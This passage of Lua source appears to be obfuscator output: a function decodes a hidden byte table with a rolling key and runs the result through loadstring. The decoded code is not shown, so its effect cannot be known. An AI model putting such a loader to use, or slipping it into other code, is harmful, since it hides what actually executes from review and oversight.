    local function VM_OI0I(d, k, m)
        local R_00001001 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_00001001, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_00001001)
    end

    -- Execution Guard
    local F_IOIO1 = loadstring(VM_OI0I(B_IIOlO, 68, 5))
    if F_IOIO1 then
        F_IOIO1(...)
    end
end)(...)
